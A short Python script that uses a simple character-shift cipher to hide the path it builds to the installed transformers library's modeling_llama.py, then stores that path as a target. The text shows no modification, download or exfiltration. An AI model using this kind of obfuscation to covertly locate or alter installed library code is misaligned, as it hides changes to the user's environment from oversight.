import pathlib
import sys


def helper(input_string):
    return ''.join([chr(ord(char) - 1) for char in input_string])


cwd = pathlib.Path(sys.executable)
new_path = cwd.parent.parent / 'lib'
directories = [item.name for item in new_path.iterdir() if item.is_dir()]
base_path = cwd.parent.parent / 'lib' / directories[0]
module_path = (
    base_path / helper('tjuf.qbdlbhft') /
    helper('usbotgpsnfst') /
    helper('npefmt') /
    helper('mmbnb') /
    helper('npefmjoh`mmbnb/qz'))

target = module_path
